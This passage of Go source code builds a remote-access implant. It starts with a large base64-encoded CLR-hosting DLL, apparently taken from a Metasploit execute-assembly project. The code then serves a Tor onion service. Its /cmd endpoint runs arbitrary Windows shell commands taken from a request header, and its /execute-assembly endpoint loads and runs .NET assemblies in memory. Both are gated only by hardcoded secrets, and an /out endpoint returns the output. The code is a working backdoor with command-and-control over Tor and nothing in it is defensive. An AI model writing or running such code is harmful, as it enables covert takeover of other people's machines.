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3RhbmNlAG1zY29yZWUuZGxsAA4AX19DeHhGcmFtZUhhbmRsZXIzAAABAF9DeHhUaHJvd0V4Y2VwdGlvbgAAPgBtZW1zZXQAAAgAX19DX3NwZWNpZmljX2hhbmRsZXIAACUAX19zdGRfdHlwZV9pbmZvX2Rlc3Ryb3lfbGlzdAAAIQBfX3N0ZF9leGNlcHRpb25fY29weQAAIgBfX3N0ZF9leGNlcHRpb25fZGVzdHJveQBWQ1JVTlRJTUUxNDAuZGxsAAAHAF9fc3RkaW9fY29tbW9uX3Zmd3ByaW50ZgAAAABfX2FjcnRfaW9iX2Z1bmMAAwBfX3N0ZGlvX2NvbW1vbl92ZnByaW50ZgCVAHN0cnRva19zAABbAG1ic3Rvd2NzAAA2AF9pbml0dGVybQA3AF9pbml0dGVybV9lAAgAX2NhbGxuZXdoABkAbWFsbG9jAAA/AF9zZWhfZmlsdGVyX2RsbAAYAF9jb25maWd1cmVfbmFycm93X2FyZ3YAADMAX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAA0AF9pbml0aWFsaXplX29uZXhpdF90YWJsZQAAIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAFgBfY2V4aXQAABgAZnJlZQAAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1zdHJpbmctbDEtMS0wLmRsbAAAYXBpLW1zLXdpbi1jcnQtY29udmVydC1sMS0xLTAuZGxsAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAANIDTG9jYWxGcmVlANMEUnRsQ2FwdHVyZUNvbnRleHQA2gRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AADhBFJ0bFZpcnR1YWxVbndpbmQAALwFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAB7BVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgCaBVRlcm1pbmF0ZVByb2Nlc3MAAIkDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudABQBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAB4CR2V0Q3VycmVudFByb2Nlc3NJZAAiAkdldEN1cnJlbnRUa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"

var output string
var stdout bytes.Buffer

func main() {

	output = ""
	//stdout.Reset()
	if err := run(); err != nil {
		log.Fatal(err)
	}
}

type ClosingBuffer struct {
	*bytes.Buffer
}

func (cb *ClosingBuffer) Close() (err error) {
	//we don't actually have to do anything here, since the buffer is
	//just some data in memory
	//and the error is initialized to no-error
	return
}

func run() error {

	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")
	conf := &tor.StartConf{RetainTempDataDir: false}
	t, err := tor.Start(nil, conf)
	if err != nil {
		return err
	}

	defer t.Close()

	// Add a handler
	//http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
	//	w.Write([]byte("Hello, Dark World!"))
	//})

	http.HandleFunc("/out", func(w http.ResponseWriter, r *http.Request) {
		if stdout.Bytes() != nil {
			w.Write([]byte(stdout.String()))
		} else {
			w.Write([]byte(""))
		}

	})

	//http.HandleFunc("/secretsauce", func(w http.ResponseWriter, r *http.Request) {
	//	secretKey := r.Header.Get("X-Forwarded-For")
	//	if r.Method == "POST" {
	//		body, err := ioutil.ReadAll(r.Body)
	//		if err != nil {
	//			http.Error(w, "Error reading request body",
	//				http.StatusInternalServerError)
	//		}
	//		if(secretKey == "1337" && strings.Contains(string(body),"badauthentication123")){
	//			w.Write([]byte("shh, you found the secret " ))
	//		} else {
	//			w.Write([]byte("Nothing to see here"))
	//		}
	//
	//		fmt.Fprint(w, "POST done")
	//	} else {
	//		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	//	}
	//
	//
	//})

	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
		secretKey := r.Header.Get("X-Forwarded-For")
		cmdGet := r.Header.Get("Cmd")

		if r.Method == "POST" {
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				http.Error(w, "Error reading request body",
					http.StatusInternalServerError)
			}
			if secretKey == "1337" && strings.Contains(string(body), "badauthentication123") {
				//fmt.Println("Authorized")

				uhh := strings.Split(cmdGet, " ")

				good := []string{"/C"}
				good = append(good, uhh...)

				cmd := exec.Command("cmd", good...)
				out, err := cmd.CombinedOutput()
				if err != nil {
					log.Printf("cmd.Run() failed with %s\n", err)
				}

				w.Write([]byte(out))
			} else {
				w.Write([]byte("Nothing to see here"))
			}

		} else {
			http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		}

	})

	// Set up handler for .Net Assembly - execute-assembly
	http.HandleFunc("/execute-assembly", func(w http.ResponseWriter, r *http.Request) {
		secretKey := r.Header.Get("X-Forwarded-For")
		executeassembly := r.Header.Get("payload")
		//hostingDLLPath := r.Header.Get("CLR_path")

		if r.Method == "POST" {
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				http.Error(w, "Error reading request body",
					http.StatusInternalServerError)
			}
			if secretKey == "1337" && strings.Contains(string(body), "badauthentication123") {
				//fmt.Println("Authorized")

				assemblyArgs := "test"
				//assemblyBytes, err := ioutil.ReadFile(assemblyPath)
				assemblyBytes, err := b64.StdEncoding.DecodeString(executeassembly)

				if err != nil {
					log.Fatal(err)
				}

				//// below is a quick way to serialize the b64 so it can be pasted as a static variable

				//hostingDLL, err := ioutil.ReadFile("C:\\Users\\Analyst\\go\\src\\github.com\\lesnuages\\go-execute-assembly-master\\HostingCLRx64.dll")
				//b64hostingDLLByteArray := b64.StdEncoding.EncodeToString(hostingDLL)
				//ioutil.WriteFile("dat1.txt", []byte(b64hostingDLLByteArray), 0644)
				//
				//fmt.Println("encoded bytes - b64hostingDLLByteArray:")
				//fmt.Println(b64hostingDLLByteArray)
				//fmt.Println("Decoding...")
				//hostingDLL,err = b64.StdEncoding.DecodeString(b64hostingDLLByteArray)

				// by default we will use the serialized x64 CLR as our .net host DLL
				hostingDLL, err := b64.StdEncoding.DecodeString(x64CLR)

				if err != nil {
					log.Fatal(err)
				}

				stdout.Reset()
				assembly.ExecuteAssembly(&stdout, hostingDLL, assemblyBytes, assemblyArgs)

				// get stdout
				//fmt.Println("cya")
				//w.Write([]byte("ugh"))
			} else {
				w.Write([]byte("Nothing to see here"))
			}

		} else {
			http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		}

	})

	// Wait at most a few minutes to publish the service
	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer listenCancel()

	// Create an onion service to listen on 8080 but show as 80
	onion, err := t.Listen(listenCtx, &tor.ListenConf{LocalPort: 8080, RemotePorts: []int{80}})
	if err != nil {
		return err
	}
	defer onion.Close()

	// Serve on HTTP
	fmt.Printf("Onion ID: %v\n", onion.ID)

	return http.Serve(onion, nil)
}
